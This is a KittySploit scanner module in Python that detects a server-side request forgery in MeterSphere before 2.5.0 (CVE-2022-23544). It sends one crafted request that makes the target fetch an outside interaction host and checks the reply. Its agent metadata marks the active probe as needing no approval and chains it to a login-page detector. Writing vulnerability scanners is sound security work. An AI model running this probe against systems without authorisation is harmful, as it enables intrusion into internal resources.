#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MeterSphere is a one-stop open source continuous testing platform, covering test management, interface testing."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MeterSphere < 2.5.0 SSRF Detection',
        'description': "MeterSphere is a one-stop open source continuous testing platform, covering test management, interface testing, UI testing and performance testing. Versions prior to 2.5.0 are subject to a Server-Side Request Forgery that leads to Cross-Site Scripting. A Server-Side request forgery in `IssueProxyResourceService::getMdImageByUrl` allows an attacker to access internal resources, as well as executing JavaScript code in the context of Metersphere's origin by a victim of a reflected XSS. This vulnerability has been fixed in v2.5.0. There are no known workarounds.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'metersphere', 'ssrf', 'oast', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23544',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-23544',
            'https://github.com/metersphere/metersphere/security/advisories/GHSA-vrv6-cg45-rmjj',
            'https://github.com/metersphere/metersphere/commit/d0f95b50737c941b29d507a4cc3545f2dc6ab121',
        ],
        'cve': 'CVE-2022-23544',
    }

    def run(self):
        r = self.http_request(method="GET", path='/resource/md/get/url?url=http://oast.pro', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('Interactsh Server',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="MeterSphere < 2.5.0 SSRF detected",
                path='/resource/md/get/url?url=http://oast.pro',
            )
            return True
        return False

